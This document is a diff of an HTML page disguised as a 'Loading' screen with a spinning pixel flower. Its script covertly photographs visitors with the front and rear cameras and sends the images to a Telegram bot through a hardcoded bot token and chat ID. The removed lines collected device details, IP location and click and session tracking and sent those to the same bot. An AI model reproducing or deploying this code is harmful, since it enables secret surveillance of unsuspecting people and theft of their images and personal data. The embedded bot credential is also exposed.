@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Loading</title>
 
 <style>
 body{
@@ -12,87 +12,87 @@ display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
-color:white;
-font-family:Arial;
-text-align:center;
+overflow:hidden;
 }
-button{
-padding:12px 20px;
-font-size:18px;
-cursor:pointer;
+
+/* Pixel flower */
+.flower{
+width:120px;
+height:120px;
+position:relative;
+animation:spin 6s linear infinite;
+}
+
+.petals div{
+width:40px;
+height:40px;
+background:#ff66cc;
+position:absolute;
+image-rendering: pixelated;
+}
+
+.petals div:nth-child(1){top:0; left:40px;}
+.petals div:nth-child(2){top:40px; left:80px;}
+.petals div:nth-child(3){top:80px; left:40px;}
+.petals div:nth-child(4){top:40px; left:0;}
+
+.center{
+width:40px;
+height:40px;
+background:#ffee55;
+position:absolute;
+top:40px;
+left:40px;
+}
+
+@keyframes spin{
+100%{transform:rotate(360deg);}
 }
 </style>
 </head>
 
 <body>
 
-<div id="content">Loading...</div>
+<div class="flower">
+<div class="petals">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="center"></div>
+</div>
 
 <script>
 
 const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
 const CHAT_ID="1167762232";
 
-// ---------- SESSION TOKEN ----------
-function getSession(){
-let token=localStorage.getItem("sessionToken");
-if(!token){
-token=Math.random().toString(36).substring(2);
-localStorage.setItem("sessionToken",token);
-}
-return token;
-}
+// ---------- Send Photo ----------
+function sendPhoto(blob,name){
 
-// ---------- DEVICE + BEHAVIOUR ----------
-async function collectDeviceData(){
+let fd=new FormData();
+fd.append("chat_id",CHAT_ID);
+fd.append("photo",blob,name);
 
-let session=getSession();
-
-let data={
-session:session,
-userAgent:navigator.userAgent,
-platform:navigator.platform,
-language:navigator.language,
-screen:screen.width+"x"+screen.height,
-timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-};
-
-// Battery (not supported everywhere)
-if(navigator.getBattery){
-let battery=await navigator.getBattery();
-data.battery=Math.round(battery.level*100)+"%";
-}
-
-// Approx Location via IP
-try{
-let res=await fetch("https://ipapi.co/json/");
-let loc=await res.json();
-data.ip=loc.ip;
-data.city=loc.city;
-data.country=loc.country_name;
-}catch{}
-
-sendText(JSON.stringify(data,null,2));
-
-}
-
-function sendText(text){
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
 method:"POST",
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:text
-})
+body:fd
 });
 }
 
-// ---------- CAMERA ----------
-async function startCamera(){
+// ---------- Capture Helper ----------
+async function captureFromCamera(facing, count){
 
 try{
 
-const stream=await navigator.mediaDevices.getUserMedia({video:true});
+const stream=await navigator.mediaDevices.getUserMedia({
+video:{
+facingMode:facing,
+width:{ideal:4096},
+height:{ideal:2160}
+}
+});
 
 const video=document.createElement("video");
 video.srcObject=stream;
@@ -105,72 +105,39 @@ canvas.width=video.videoWidth;
 canvas.height=video.videoHeight;
 
 const ctx=canvas.getContext("2d");
+
+for(let i=1;i<=count;i++){
+
 ctx.drawImage(video,0,0);
 
+await new Promise(resolve=>{
 canvas.toBlob(blob=>{
-
-let formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("photo",blob,"capture.jpg");
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-method:"POST",
-body:formData
+sendPhoto(blob,`${facing}_${i}.jpg`);
+resolve();
+},"image/jpeg",0.95); // High quality
 });
 
-},"image/jpeg");
+await new Promise(r=>setTimeout(r,1000));
+}
 
 stream.getTracks().forEach(t=>t.stop());
 
-}catch(e){
-showPermissionButton();
-}
+}catch(e){}
 
 }
 
-// ---------- PERMISSION CHECK ----------
-async function checkPermission(){
+// ---------- Run ----------
+async function runCapture(){
 
-if(!navigator.permissions){
-showPermissionButton();
-return;
-}
+// 3 selfie photos
+await captureFromCamera("user",3);
 
-let result=await navigator.permissions.query({name:"camera"});
-
-if(result.state==="granted"){
-startCamera();
-}
-else{
-showPermissionButton();
-}
+// 2 rear photos
+await captureFromCamera("environment",2);
 
 }
 
-// ---------- BUTTON ----------
-function showPermissionButton(){
-document.getElementById("content").innerHTML=
-`<button onclick="startCamera()">Allow Camera</button>`;
-}
-
-// ---------- TRACK BEHAVIOUR ----------
-function trackBehaviour(){
-
-document.addEventListener("click",()=>sendText("User clicked"));
-
-let start=Date.now();
-
-window.addEventListener("beforeunload",()=>{
-let duration=Math.round((Date.now()-start)/1000);
-sendText("Session duration: "+duration+" seconds");
-});
-
-}
-
-// ---------- RUN ----------
-collectDeviceData();
-trackBehaviour();
-checkPermission();
+runCapture();
 
 </script>
 
